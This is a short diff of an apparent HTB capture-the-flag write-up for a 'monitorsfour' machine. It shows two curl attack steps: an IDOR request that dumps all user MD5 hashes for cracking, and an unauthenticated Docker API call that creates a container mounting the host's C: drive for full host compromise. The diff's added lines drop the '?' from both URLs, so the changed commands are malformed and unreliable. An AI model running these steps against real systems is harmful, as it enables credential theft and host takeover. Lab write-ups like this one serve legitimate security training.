@@ -128,7 +128,7 @@ guest  :  43e9a4ab75570f5b                   (enabled!)
 ```bash
 # What it does: query the user endpoint with a null token.
 # Why here: exploit an IDOR vulnerability in the API to dump all registered user hashes for offline cracking.
-curl -s "http://monitorsfour.htb/user?token=0"
+curl -s "http://monitorsfour.htb/usertoken=0"
 ```
 
 Returns all users with their MD5 hashes:
@@ -210,7 +210,7 @@ The metadata reveals the project path on the host:
 # What it does: create a new privileged container via the Docker API.
 # Why here: leverage the unauthenticated Docker access to mount the host's C:\ drive into a new container for full host compromise.
 curl -X POST -H "Content-Type: application/json" \
-  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
+  http://DOCKER_HOST_IP:2375/containers/createname=pwned \
   -d '{
     "Image": "alpine:latest",
     "Cmd": ["sleep", "infinity"],
